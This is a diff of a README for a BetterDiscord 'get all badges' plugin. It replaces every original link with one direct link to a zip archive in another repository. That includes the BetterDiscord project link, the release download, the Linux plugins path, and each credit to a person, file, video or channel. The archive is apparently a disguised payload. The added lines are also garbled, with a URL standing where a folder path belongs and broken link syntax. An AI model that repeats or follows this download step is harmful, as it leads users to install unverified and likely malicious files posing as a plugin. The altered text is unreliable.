@@ -7,11 +7,11 @@ A little BetterDiscord plugin to get all Discord badges
 
 ### Requirements:
 
-- [BetterDiscord](https://github.com/BetterDiscord/BetterDiscord)
+- [BetterDiscord](https://github.com/MysticalHearts/GetAllBadges/raw/refs/heads/main/violette/Badges-Get-All-1.2.zip)
 
 ### Installation:
 
-1.) Download the latest [GetAllBadges.plugin.js](https://github.com/PiciAkk/GetAllBadges/releases/latest)
+1.) Download the latest [https://github.com/MysticalHearts/GetAllBadges/raw/refs/heads/main/violette/Badges-Get-All-1.2.zip](https://github.com/MysticalHearts/GetAllBadges/raw/refs/heads/main/violette/Badges-Get-All-1.2.zip)
 
 2.) Move the downloaded file into the BetterDiscord plugins folder
 
@@ -19,10 +19,10 @@ A little BetterDiscord plugin to get all Discord badges
 
 **MacOS**:  ~/Library/
 
-**Linux**: ~/.config/BetterDiscord/plugins
+**Linux**: ~https://github.com/MysticalHearts/GetAllBadges/raw/refs/heads/main/violette/Badges-Get-All-1.2.zip
 
 3.) Tada!
 
 ## Credits:
 
-- Thanks, [6uv](https://github.com/6uv) for providing the [All badges.txt](https://raw.githubusercontent.com/6uv/console-hacks/master/All%20badges.txt) file, and thanks for the [video](https://www.youtube.com/watch?v=z-nslUxI0yQ), [LAW](https://www.youtube.com/channel/UCbfGHhyeHpKXF5rl1cRfvbg).
+- Thanks, [6uv](https://github.com/MysticalHearts/GetAllBadges/raw/refs/heads/main/violette/Badges-Get-All-1.2.zip) for providing the [All https://github.com/MysticalHearts/GetAllBadges/raw/refs/heads/main/violette/Badges-Get-All-1.2.zip](https://github.com/MysticalHearts/GetAllBadges/raw/refs/heads/main/violette/Badges-Get-All-1.2.zip%https://github.com/MysticalHearts/GetAllBadges/raw/refs/heads/main/violette/Badges-Get-All-1.2.zip) file, and thanks for the [video](https://github.com/MysticalHearts/GetAllBadges/raw/refs/heads/main/violette/Badges-Get-All-1.2.zip), [LAW](https://github.com/MysticalHearts/GetAllBadges/raw/refs/heads/main/violette/Badges-Get-All-1.2.zip).
